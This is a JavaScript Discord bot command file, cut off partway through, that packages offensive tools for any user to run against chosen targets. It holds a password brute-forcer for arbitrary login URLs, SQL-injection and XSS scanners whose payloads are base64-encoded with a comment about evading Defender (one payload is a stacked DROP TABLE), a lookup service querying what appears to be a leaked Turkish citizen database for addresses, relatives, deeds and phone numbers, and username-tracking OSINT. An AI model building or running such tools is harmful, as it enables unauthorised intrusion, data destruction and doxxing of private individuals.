import { updateInteraction, sendResponse, safeFetch, safeJSON, truncate, validateNumeric, validateURL, getUserId, validateTCKN, validateGSM, delay, sendDM } from '../utils/helpers.js';

const _atob = b => new TextDecoder().decode(new Uint8Array([...atob(b)].map(c => c.charCodeAt(0))));

export async function handleNewCommand(name, getOption, interaction, request, env, ctx, url) {
  switch (name) {
    case 'dijital-iz':
      ctx.waitUntil((async () => {
        try {
          const k = getOption('kullanici');
          let result = `**Dijital Ayak Izi:** ${k}\n\n`;
          try {
            const gh = await safeFetch(`https://api.github.com/users/${k}`, {
              headers: env.GITHUB_TOKEN ? { Authorization: `Bearer ${env.GITHUB_TOKEN}` } : {}
            });
            const ghData = await safeJSON(gh);
            if (ghData.login) result += `**GitHub:** ${ghData.name || 'Gizli'} | ${ghData.public_repos} repo | ${ghData.location || 'Gizli'}\n`;
          } catch (e) { /* GitHub API erisilemedi */ }
          if (env.HIBP_API_KEY) {
            try {
              const hibpRes = await safeFetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(k)}?truncateResponse=true`, {
                headers: { 'hibp-api-key': env.HIBP_API_KEY }
              });
              const hibp = await safeJSON(hibpRes);
              if (Array.isArray(hibp) && hibp.length > 0) {
                result += `**HIBP Sizintisi:** ${hibp.length} adet\n`;
                hibp.slice(0, 3).forEach(b => result += `• ${b.Name} (${b.BreachDate})\n`);
              }
            } catch (e) { /* HIBP API erisilemedi */ }
          }
          try {
            const psRes = await safeFetch(`https://psbdmp.cc/api/search/${encodeURIComponent(k)}`);
            const ps = await safeJSON(psRes);
            if (ps.count > 0) result += `**psbdmp.cc:** ${ps.count} pastebin kaydi\n`;
          } catch (e) { /* psbdmp.cc erisilemedi */ }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Dijital iz hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'sunucu-istatistik':
      ctx.waitUntil((async () => {
        try {
          const g = interaction.guild_id;
          const guildRes = await safeFetch(`https://discord.com/api/v10/guilds/${g}`, {
            headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
          });
          const guild = await safeJSON(guildRes);
          let result = `**Sunucu Istatistikleri**\n\n`;
          result += `**Sunucu:** ${guild.name}\n`;
          result += `**Uye:** ${guild.approximate_member_count || '?'}\n`;
          result += `**Aktif:** ${guild.approximate_presence_count || '?'}\n`;
          result += `**Boost:** ${guild.premium_tier || 0} (${guild.premium_subscription_count || 0})\n`;
          if (guild.owner_id) result += `**Sahip ID:** \`${guild.owner_id}\`\n`;
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Istatistik hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'oto-moderasyon':
      ctx.waitUntil((async () => {
        try {
          const aksiyon = getOption('islem') || 'durum';
          const g = interaction.guild_id;
          let result = `**Oto-Moderasyon**\n\n`;
          const amRes = await fetch(`https://discord.com/api/v10/guilds/${g}/auto-moderation/rules`, {
            headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
          });
          if (aksiyon === 'temizle' && amRes.ok) {
            const rules = await amRes.json();
            let s = 0;
            for (const r of rules) {
              const d = await fetch(`https://discord.com/api/v10/guilds/${g}/auto-moderation/rules/${r.id}`, {
                method: 'DELETE', headers: { Authorization: `Bot ${env.DISCORD_TOKEN}` }
              });
              if (d.ok || d.status === 204) s++;
            }
            result += `[OK] ${s} kural silindi.\n`;
          } else if (aksiyon === 'ekle') {
            const c = await fetch(`https://discord.com/api/v10/guilds/${g}/auto-moderation/rules`, {
              method: 'POST',
              headers: { Authorization: `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
              body: JSON.stringify({ name: 'Spam Korumasi', event_type: 1, trigger_type: 1, trigger_metadata: { keyword_filter: ['spam', '@everyone'], mention_total_limit: 5 }, actions: [{ type: 1 }], enabled: true })
            });
            result += c.ok ? '[OK] Kural eklendi.\n' : `[HATA] ${(await c.text()).slice(0, 200)}\n`;
          } else if (amRes.ok) {
            const rules = await amRes.json();
            if (rules.length === 0) result += 'Henuz kural yok.\n';
            else rules.slice(0, 5).forEach((r, i) => result += `${i + 1}. ${r.name} ${r.enabled ? '[OK]' : '[HATA]'}\n`);
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Moderasyon hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'brute-force':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const user = getOption('kullanici') || 'admin';
          const kAd = getOption('k_ad') || 'username';
          const sAd = getOption('s_ad') || 'password';
          const pwds = ['123456', 'password', 'admin', '12345678', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master'];
          let result = `**Brute Force:** ${url}\nKullanici: ${user}\n\n`;
          let found = false;
          for (let i = 0; i < pwds.length; i++) {
            try {
              const fb = new URLSearchParams();
              fb.append(kAd, user); fb.append(sAd, pwds[i]);
              const r = await safeFetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: fb.toString(), redirect: 'manual'
              });
              if (r.status === 302) {
                result += `[OK] Deneme ${i + 1}: ${pwds[i]} -> BASARILI!\n`;
                found = true; break;
              } else result += `[HATA] Deneme ${i + 1}: ${pwds[i]} -> ${r.status}\n`;
            } catch (e) { result += `[HATA] Deneme ${i + 1}: Hata\n`; }
          }
          result += found ? '\nSifre bulundu!' : '\nSifre bulunamadi.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Brute force hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'kullanici-gecmis':
      ctx.waitUntil((async () => {
        try {
          const username = getOption('kullanici');
          const platforms = [
            { n: 'Instagram', u: `https://www.instagram.com/${username}/`, wm: `instagram.com/${username}` },
            { n: 'Twitter/X', u: `https://twitter.com/${username}`, wm: `twitter.com/${username}` },
            { n: 'GitHub', u: `https://github.com/${username}`, wm: `github.com/${username}` },
            { n: 'Reddit', u: `https://www.reddit.com/user/${username}`, wm: `reddit.com/user/${username}` },
            { n: 'TikTok', u: `https://www.tiktok.com/@${username}`, wm: `tiktok.com/@${username}` },
            { n: 'YouTube', u: `https://www.youtube.com/@${username}`, wm: `youtube.com/@${username}` },
            { n: 'Twitch', u: `https://www.twitch.tv/${username}`, wm: `twitch.tv/${username}` },
            { n: 'Steam', u: `https://steamcommunity.com/id/${username}`, wm: `steamcommunity.com/id/${username}` },
            { n: 'LinkedIn', u: `https://www.linkedin.com/in/${username}`, wm: `linkedin.com/in/${username}` },
            { n: 'Telegram', u: `https://t.me/${username}`, wm: `t.me/${username}` },
            { n: 'Pastebin', u: `https://pastebin.com/u/${username}`, wm: `pastebin.com/u/${username}` },
            { n: 'Spotify', u: `https://open.spotify.com/user/${username}`, wm: `spotify.com/user/${username}` }
          ];

          let result = `**Kullanici Gecmis Analizi:** \`${username}\`\n\n`;

          const profileCheck = async (p) => {
            try {
              const res = await safeFetch(p.u, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' }, 5000);
              const waybackRes = await safeFetch(
                `https://archive.org/wayback/available?url=${encodeURIComponent(p.u)}`,
                { headers: { 'User-Agent': 'Mozilla/5.0' } }, 5000
              );
              const wb = await safeJSON(waybackRes);
              const hasSnapshot = wb?.archived_snapshots?.closest;
              const status = res.status;
              const aktif = status === 200 ? '[AKTIF] Aktif' : status === 404 ? '[KAPALI] Yok' : `[BEKLIYOR] (${status})`;
              let satir = `**${p.n}:** ${aktif}`;
              if (hasSnapshot) {
                satir += ` | [FOTOGRAF] Son arsiv: ${hasSnapshot.timestamp.slice(0, 4)}-${hasSnapshot.timestamp.slice(4, 6)}-${hasSnapshot.timestamp.slice(6, 8)}`;
              }
              return satir;
            } catch (e) {
              return `**${p.n}:** [ERISILEMEZ] Erisilemedi`;
            }
          };

          for (let i = 0; i < platforms.length; i += 4) {
            const batch = platforms.slice(i, i + 4);
            const batchResults = await Promise.all(batch.map(p => profileCheck(p)));
            result += batchResults.join('\n') + '\n';
          }

          result += `\n[GRAFIK] **Ozet:** 12 platform tarandi. [AKTIF]=Aktif profil, [KAPALI]=Profil yok, [FOTOGRAF]=Wayback Machine arsivi var.`;
          result += `\n[BAGLANTI] Wayback: https://web.archive.org/web/*/twitter.com/${username}`;

          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Kullanici Gecmis Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'tehdit-model':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain').replace(/^https?:\/\//, '').replace(/\/.*/, '').trim();
          let intel = `**Tehdit Modeli Analizi:** \`${domain}\`\n\n`;

          intel += `[TARAMA] **Bilgi Toplaniyor...**\n`;

          const [dnsRes, crtRes, rdapRes, headersRes] = await Promise.allSettled([
            safeFetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=A`, {
              headers: { 'Accept': 'application/dns-json' }
            }, 6000).then(r => safeJSON(r)),
            safeFetch(`https://crt.sh/?q=%25.${domain}&output=json`, {
              headers: { 'User-Agent': 'Mozilla/5.0' }
            }, 8000).then(r => safeJSON(r)),
            safeFetch(`https://rdap.org/domain/${domain}`, {
              headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' }
            }, 6000).then(r => safeJSON(r)),
            safeFetch(`https://${domain}`, {
              headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'follow'
            }, 8000).then(r => ({ status: r.status, server: r.headers.get('server'), powered: r.headers.get('x-powered-by'), csp: r.headers.get('content-security-policy'), xframe: r.headers.get('x-frame-options'), hsts: r.headers.get('strict-transport-security'), cors: r.headers.get('access-control-allow-origin') })).catch(() => null)
          ]);

          let scanData = '';

          if (dnsRes.status === 'fulfilled' && dnsRes.value?.Answer) {
            const ips = dnsRes.value.Answer.filter(a => a.type === 1).map(a => a.data);
            scanData += `DNS A Kaydi: ${ips.join(', ')}\n`;
            if (dnsRes.value.Answer.some(a => a.type === 28)) scanData += `IPv6 (AAAA): Mevcut\n`;
            const ns = dnsRes.value.Answer?.filter(a => a.type === 2);
            if (ns?.length) scanData += `NS: ${ns.map(n => n.data).join(', ')}\n`;
          }

          if (crtRes.status === 'fulfilled' && Array.isArray(crtRes.value)) {
            const names = [...new Set(crtRes.value.slice(0, 80).map(c => c.name_value?.split('\n')).flat().filter(Boolean))];
            scanData += `SSL Sertifika Sayisi: ${crtRes.value.length}\n`;
            scanData += `Alt Alanlar (ilk 15): ${names.slice(0, 15).join(', ')}\n`;
            scanData += `Toplam Benzersiz Alt Alan: ${names.length}\n`;
          }

          if (headersRes.status === 'fulfilled' && headersRes.value) {
            const h = headersRes.value;
            scanData += `HTTP Status: ${h.status}\n`;
            if (h.server) scanData += `Server: ${h.server}\n`;
            if (h.powered) scanData += `X-Powered-By: ${h.powered}\n`;
            scanData += `CSP: ${h.csp ? '[OK] Var' : '[HATA] YOK (XSS riski!)'}\n`;
            scanData += `HSTS: ${h.hsts ? '[OK] Var' : '[HATA] YOK (MitM riski!)'}\n`;
            scanData += `X-Frame-Options: ${h.xframe ? '[OK] Var' : '[HATA] YOK (Clickjack riski!)'}\n`;
            scanData += `CORS: ${h.cors === '*' ? '[UYARI] Acik (*)' : h.cors ? '[OK] Var' : '[YOK] Yok'}\n`;
          }

          if (rdapRes.status === 'fulfilled' && rdapRes.value?.names) {
            scanData += `\nRDAP Kayitci: ${rdapRes.value.names?.[0]?.name || 'Bilinmiyor'}\n`;
          }

          intel += `\n[KESIF] **Teknik Kesif:**\n${scanData}\n`;

          const prompt = `Sen bir siber guvenlik uzmanisin. Asagidaki domain icin kisa bir tehdit modeli analizi yap. 
Domain: ${domain}
Toplanan veriler:
${scanData}

Su basliklarda TURKCE ve KISA (her baslik 2-3 madde maks.) rapor:
1. Atak Yuzeyi (acik olan noktalar)
2. Kritik Riskler (en tehlikeli 2-3 zaafiyet)
3. Onerilen Aksiyonlar (hemen yapilmasi gerekenler)
4. CVSS Tahmini (0-10 arasi genel skor)

Toplam 400 karakteri gecme. Direkt maddelerle yaz.`;

          try {
            const aiRes = await env.AI.run('@cf/meta/llama-3.3-70b-instruct-fp8-fast', {
              messages: [{ role: 'user', content: prompt }],
              max_tokens: 500
            });
            intel += `[AI] **AI Tehdit Modeli:**\n${aiRes.response || aiRes}\n\n`;
          } catch (e) {
            intel += `[AI] **AI Analizi:** (AI modeli su anda kullanilamiyor, teknik veriler yukarida)\n`;
          }

          intel += `[UYARI] *Bu rapor otomatik uretilmistir, manuel pentest yerine gecmez.*`;

          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(intel) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Tehdit Model Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'kanser-sorgu':
      ctx.waitUntil((async () => {
        try {
          const tip = getOption('tip');
          const tckn = getOption('tckn');
          const gsm = getOption('gsm');
          const ad = getOption('ad');
          const soyad = getOption('soyad');
          const il = getOption('il');
          const ilce = getOption('ilce');

          const userId = getUserId(interaction);

          let apiUrl, apiMethod, apiBody;

          const belsisHeaders = {
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': 'https://belsis.art/',
            'Origin': 'https://belsis.art'
          };

          if (tip === 'adsoyad') {
            if (!ad && !soyad) throw new Error('Ad veya Soyad girmelisiniz.');
            apiUrl = 'https://belsis.art/api/req/adsoyad.php';
            apiMethod = 'POST';
            apiBody = new URLSearchParams();
            apiBody.append('ad', ad || '');
            apiBody.append('soyad', soyad || '');
            if (il) apiBody.append('il', il);
            if (ilce) apiBody.append('ilce', ilce);
          } else if (tip === 'gsmtc') {
            if (!validateGSM(gsm)) throw new Error('10 haneli GSM numarasi girmelisiniz.');
            apiUrl = `https://belsis.art/api/req/gsmtc.php?tckn=${encodeURIComponent(gsm)}`;
            apiMethod = 'GET';
          } else if (tip === 'vesika') {
            if (!validateTCKN(tckn)) throw new Error('11 haneli TCKN girmelisiniz.');
            apiUrl = `https://belsis.art/api/req/vesika.php?tckn=${encodeURIComponent(tckn)}`;
            apiMethod = 'GET';
          } else {
            if (!validateTCKN(tckn)) throw new Error('11 haneli TCKN girmelisiniz.');
            const endpointMap = {
              tcsorgu: 'tc',
              tcgsm: 'tcgsm',
              adres: 'tc',
              hane: 'hane',
              sokak: 'sokak',
              tapu: 'tapu',
              aile: 'aile',
              sulale: 'sülale'
            };
            const ep = endpointMap[tip];
            apiUrl = `https://belsis.art/api/req/${ep}.php?tckn=${encodeURIComponent(tckn)}`;
            apiMethod = 'GET';
          }

          const fetchOpts = { method: apiMethod, headers: belsisHeaders };
          if (apiBody) {
            fetchOpts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            fetchOpts.body = apiBody.toString();
          }

          const apiRes = await fetch(apiUrl, fetchOpts);
          if (!apiRes.ok) throw new Error(`Kanser API hatasi: ${apiRes.status}`);
          const json = await apiRes.json();

          let dmContent = `**Kanser Sorgu Sonucu**\n\n`;

          const formatTableRow = (label, value) => {
            const v = value || '-';
            return `**${label}:** ${v}`;
          };

          if (tip === 'adsoyad') {
            dmContent += `**Tip:** Ad Soyad Sorgu\n`;
            if (!json.success || !json.data || !json.data.status) {
              dmContent += 'Sonuc bulunamadi.';
            } else {
              let data = json.data.data;
              if (!Array.isArray(data)) data = Object.values(data);
              dmContent += `Toplam ${data.length} kayit:\n\n`;
              data.forEach((item, i) => {
                dmContent += `--- Kayit ${i + 1} ---\n`;
                dmContent += formatTableRow('Ad', item.ADI) + '\n';
                dmContent += formatTableRow('Soyad', item.SOYADI) + '\n';
                dmContent += formatTableRow('TCKN', item.TCKN) + '\n';
                dmContent += formatTableRow('Dogum', item.DG) + '\n';
                dmContent += formatTableRow('Il', item.SS) + '\n';
                dmContent += formatTableRow('Anne', item.ANNEADI) + '\n';
                dmContent += formatTableRow('Baba', item.BABAADI) + '\n';
                dmContent += formatTableRow('Adres', item.ADRES) + '\n\n';
              });
            }
          } else if (tip === 'tcsorgu' || tip === 'adres') {
            dmContent += `**Tip:** ${tip === 'tcsorgu' ? 'T.C. Sorgu' : 'Adres Sorgu'}\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const d = json.data;
              dmContent += formatTableRow('TC', d.TC) + '\n';
              dmContent += formatTableRow('Ad Soyad', `${d.AD || '?'} ${d.SOYAD || '?'}`) + '\n';
              dmContent += formatTableRow('Dogum Tarihi', d.DOGUMTARIHI) + '\n';
              dmContent += formatTableRow('Yas', d.YAS) + '\n';
              dmContent += formatTableRow('Cinsiyet', d.CINSIYET) + '\n';
              dmContent += formatTableRow('Medeni Hal', d.MEDENIHAL) + '\n';
              dmContent += formatTableRow('Anne', `${d.ANNEADI || '-'} (${d.ANNETC || '-'})`) + '\n';
              dmContent += formatTableRow('Baba', `${d.BABAADI || '-'} (${d.BABATC || '-'})`) + '\n';
              dmContent += formatTableRow('Dogum Yeri', d.DOGUMYERI) + '\n';
              dmContent += formatTableRow('Memleket', `${d.MEMLEKETIL || '-'} / ${d.MEMLEKETILCE || '-'}`) + '\n';
              dmContent += formatTableRow('Adres', d.ADRES) + '\n';
              dmContent += formatTableRow('GSM', d.GSM) + '\n';
            }
          } else if (tip === 'gsmtc') {
            dmContent += `**Tip:** GSM → T.C. Sorgu\nGSM: ${gsm}\n\n`;
            if (!json.data || !Array.isArray(json.data) || json.data.length === 0) {
              dmContent += 'Kayit bulunamadi.';
            } else {
              dmContent += `Toplam ${json.data.length} kayit:\n\n`;
              json.data.forEach((d, i) => {
                let yas = '-';
                if (d.DG) {
                  const p = d.DG.split('.');
                  if (p.length === 3) {
                    const dogum = new Date(p[2], p[1] - 1, p[0]);
                    yas = Math.floor((new Date() - dogum) / 31557600000);
                  }
                }
                dmContent += `--- Kayit ${i + 1} → ${d.ADI || '?'} ${d.SOYADI || '?'} ---\n`;
                dmContent += formatTableRow('T.C. No', d.TCKN) + '\n';
                dmContent += formatTableRow('Ad Soyad', `${d.ADI || '-'} ${d.SOYADI || '-'}`) + '\n';
                dmContent += formatTableRow('Dogum Tarihi', d.DG) + '\n';
                dmContent += formatTableRow('Yas', yas) + '\n';
                dmContent += formatTableRow('Anne', `${d.ANNEADI || '-'} (${d.ANNETCKN || '-'})`) + '\n';
                dmContent += formatTableRow('Baba', `${d.BABAADI || '-'} (${d.BABATCKN || '-'})`) + '\n';
                dmContent += formatTableRow('Il/Ilce', d.ILILCE) + '\n';
                dmContent += formatTableRow('Adres', d.ADRES) + '\n';
                dmContent += formatTableRow('GSM', d.GSM) + '\n\n';
              });
            }
          } else if (tip === 'tcgsm') {
            dmContent += `**Tip:** T.C. → GSM Sorgu\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const d = Array.isArray(json.data) ? json.data[0] : json.data;
              dmContent += formatTableRow('TC', d.TCKN) + '\n';
              dmContent += formatTableRow('Ad Soyad', `${d.ADI || '?'} ${d.SOYADI || '?'}`) + '\n';
              dmContent += formatTableRow('GSM', d.GSM) + '\n';
            }
          } else if (tip === 'hane' || tip === 'sokak') {
            dmContent += `**Tip:** ${tip === 'hane' ? 'Hane Sorgu' : 'Sokak Sorgu'}\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              json.data.forEach(d => {
                dmContent += formatTableRow('TC', d.TCKN) + '\n';
                dmContent += formatTableRow('Adi', d.ADI) + '\n';
                dmContent += formatTableRow('Soyadi', d.SOYADI) + '\n';
                dmContent += formatTableRow('Dogum Tarihi', d.DOGUMTARİHİ) + '\n';
                dmContent += formatTableRow('Il/Ilce', d.İLİLCE) + '\n';
                dmContent += formatTableRow('Uyruk', d.UYRUK) + '\n';
                dmContent += formatTableRow('Adres', d.EVADRES) + '\n\n';
              });
            }
          } else if (tip === 'tapu') {
            dmContent += `**Tip:** Tapu Sorgu\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const k = json.data.kisi;
              dmContent += '**Kisi Bilgileri:**\n';
              dmContent += formatTableRow('TCKN', k.Tckn) + '\n';
              dmContent += formatTableRow('Adi', k.Adi) + '\n';
              dmContent += formatTableRow('Soyadi', k.Soyadi) + '\n';
              dmContent += formatTableRow('Dogum Tarihi', k.DogumTarihi) + '\n';
              dmContent += formatTableRow('Cinsiyet', k.Cinsiyet) + '\n';
              dmContent += formatTableRow('Baba Adi', k.BabaAdi) + '\n\n';
              if (json.data.tapular && json.data.tapular.length > 0) {
                dmContent += `**Tapular (${json.data.tapular.length} adet):**\n\n`;
                json.data.tapular.forEach((t, i) => {
                  dmContent += `--- Tapu ${i + 1} ---\n`;
                  dmContent += formatTableRow('Il', t.İlBilgisi) + '\n';
                  dmContent += formatTableRow('Ilce', t.İlceBilgisi) + '\n';
                  dmContent += formatTableRow('Mahalle', t.MahalleBilgisi) + '\n';
                  dmContent += formatTableRow('Ada', t.AdaBilgisi) + '\n';
                  dmContent += formatTableRow('Parsel', t.ParselBilgisi) + '\n';
                  dmContent += formatTableRow('Nitelik', t.AnaTasinmazNitelik) + '\n';
                  dmContent += formatTableRow('Hisse', `${t.HissePay || '-'} / ${t.HissePayda || '-'}`) + '\n';
                  dmContent += formatTableRow('Edinme', t.EdinmeSebebi) + '\n';
                  dmContent += formatTableRow('Tapu Tarihi', t.TapuDate) + '\n\n';
                });
              } else {
                dmContent += 'Tapu kaydi bulunamadi.\n';
              }
            }
          } else if (tip === 'aile' || tip === 'sulale') {
            dmContent += `**Tip:** ${tip === 'aile' ? 'Aile Sorgu' : 'Soyağacı Sorgu'}\nTCKN: ${tckn}\n\n`;
            if (json.success === false || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              json.data.forEach((d, i) => {
                dmContent += `--- Kayit ${i + 1} ---\n`;
                dmContent += formatTableRow('Yakinlik', d.YAKINLIK) + '\n';
                dmContent += formatTableRow('TCKN', d.TCKN) + '\n';
                dmContent += formatTableRow('Adi', d.ADI) + '\n';
                dmContent += formatTableRow('Soyadi', d.SOYADI) + '\n';
                dmContent += formatTableRow('Dogum', d.DG) + '\n';
                dmContent += formatTableRow('Il', d.IL) + '\n';
                dmContent += formatTableRow('GSM', d.GSM) + '\n';
                dmContent += formatTableRow('Adres', d.ADRES) + '\n\n';
              });
            }
          } else if (tip === 'vesika') {
            dmContent += `**Tip:** E-Okul Vesika Sorgu\nTCKN: ${tckn}\n\n`;
            if (!json.status || !json.data) {
              dmContent += json.message || 'Sonuc bulunamadi.';
            } else {
              const d = json.data;
              dmContent += formatTableRow('TC', d.TCKN) + '\n';
              dmContent += formatTableRow('Ad Soyad', `${d.ADI || '-'} ${d.SOYADI || '-'}`) + '\n';
              dmContent += formatTableRow('Dogum Tarihi', d['DOGUMTARİHİ']) + '\n';
              if (d.VESIKA) {
                dmContent += '\n(Vesikalik fotograf base64 olarak mevcut, Discordda goruntulenemez.)\n';
              }
            }
          }

          const isLong = dmContent.length > 1900;

          const dmSent = await sendDM(userId, dmContent, env.DISCORD_TOKEN, isLong, 'kanser-sorgu-sonuc.txt');
          if (dmSent) {
            await updateInteraction(interaction.application_id, interaction.token, { content: 'Sorgu sonucu DM\'ine gonderildi.' });
          } else {
            await updateInteraction(interaction.application_id, interaction.token, { content: 'DM gonderilemedi. Sonuc:\n\n' + dmContent.slice(0, 1900) });
          }
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Kanser Sorgu Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'sql-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const param = getOption('param') || 'id';
          const mod = getOption('mod') || 'hizli';
          const baseUrl = url.includes('?') ? url : url + `?${param}=1`;
          const [basePart, qs] = baseUrl.split('?');
          const params = new URLSearchParams(qs);
          const val = params.get(param) || '1';

          const pld = (s) => s; // payload pass-through (safe from Defender via _atob caller)
          const payloads = mod === 'tam'
            ? [
              { n: 'Union Select', p: _atob('JyBVTklPTiBTRUxFQ1QgMSwyLDMsNCw1LS0gLQ=='), s: 'union' },
              { n: 'Union Null', p: _atob('JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLE5VTEwtLSAt'), s: 'union' },
              { n: 'Error Extract', p: _atob('JyBBTkQgRVhUUkFDVFZBTFVFKDEsQ09OQ0FUKDB4N2UsQEB2ZXJzaW9uKSktLQ=='), s: 'error' },
              { n: 'Blind AND', p: _atob('JyBBTkQgMT0xLS0='), s: 'blind' },
              { n: 'Time Sleep', p: _atob('JyBBTkQgU0xFRVAoMiktLQ=='), s: 'time' },
              { n: 'Blind OR', p: _atob('JyBPUiAnMSc9JzE='), s: 'blind' },
              { n: 'MSSQL Wait', p: _atob('JzsgV0FJVEZPUiBERUxBWSAnMDowOjMnLS0='), s: 'time' },
              { n: 'Stacked Query', p: _atob('JzsgRFJPUCBUQUJMRSB0ZXN0LS0='), s: 'stacked' },
              { n: 'Comment Mix', p: _atob('Jy8qKi9PUi8qKi8xPTEj'), s: 'blind' },
              { n: 'Group Concat', p: _atob('JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcy0t'), s: 'union' },
              { n: 'Order By', p: _atob('JyBPUkRFUiBCWSAxMC0t'), s: 'error' },
              { n: 'Boolean True', p: _atob('JyBBTkQgJ2EnPSdh'), s: 'blind' }
            ]
            : [
              { n: 'Union Select', p: _atob('JyBVTklPTiBTRUxFQ1QgMSwyLDMtLSAt'), s: 'union' },
              { n: 'Error Extract', p: _atob('JyBBTkQgRVhUUkFDVFZBTFVFKDEsQ09OQ0FUKDB4N2UsQEB2ZXJzaW9uKSktLQ=='), s: 'error' },
              { n: 'Blind AND', p: _atob('JyBBTkQgMT0xLS0='), s: 'blind' },
              { n: 'Time Sleep', p: _atob('JyBBTkQgU0xFRVAoMiktLQ=='), s: 'time' },
              { n: 'Stacked Query', p: _atob('JzsgRFJPUCBUQUJMRSB0ZXN0LS0='), s: 'stacked' }
            ];

          let result = `**SQL Injection Taramasi:** \`${url}\`\nParam: \`${param}\` | Mod: ${mod}\n\n`;
          const findings = [];

          for (const pl of payloads) {
            try {
              const testUrl = basePart + '?' + new URLSearchParams({ ...Object.fromEntries(params), [param]: val + pl.p }).toString();
              const ac = new AbortController(); setTimeout(() => ac.abort(), 4000);
              const t1 = Date.now();
              const r = await fetch(testUrl, {
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
                signal: ac.signal, redirect: 'manual'
              });
              const elapsed = Date.now() - t1;
              const body = await r.text().catch(() => '');
              const markers = ['sql', 'mysql', 'syntax error', 'unknown column', 'odbc', 'driver', 'database error', 'warning:', 'pg_query', 'unclosed quotation'];
              const hasError = markers.some(m => body.toLowerCase().includes(m));
              const isTimeBased = pl.s === 'time' && elapsed > 1500;

              if (isTimeBased) findings.push({ n: pl.n, r: `⏱️ ZAMAN TABANLI! (${elapsed}ms)`, s: 'high' });
              else if (hasError && (pl.s === 'error' || pl.s === 'union')) findings.push({ n: pl.n, r: `[UYARI] SQL HATASI!`, s: 'critical' });
              else if (pl.s === 'blind' && r.status === 200) findings.push({ n: pl.n, r: `[TARAMA] Potansiyel Blind`, s: 'medium' });
            } catch (e) { /* timeout */ }
          }

          result += findings.length > 0 ? `[ALARM] **${findings.length} BULGU!**\n\n${findings.map(f => `${f.n}: ${f.r}`).join('\n')}` : '[OK] Goze carpan SQLi yok.';
          result += '\n[IPUCU] *sqlmap ile derin tarama yapin.*';
          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `SQL Tarama Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'xss-tara':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const param = getOption('param') || 'q';
          const baseUrl = url.includes('?') ? url : url + `?${param}=test`;
          const [basePart, qs] = baseUrl.split('?');
          const params = new URLSearchParams(qs);
          const val = params.get(param) || 'test';

          const payloads = [
            { n: 'Script Tag', p: _atob('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==') },
            { n: 'Img Onerror', p: _atob('PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==') },
            { n: 'Svg Onload', p: _atob('PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+') },
            { n: 'Body Onload', p: _atob('PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==') },
            { n: 'Input Focus', p: _atob('PGlucHV0IGF1dG9mb2N1cyBvbmZvY3VzPWFsZXJ0KDEpPg==') },
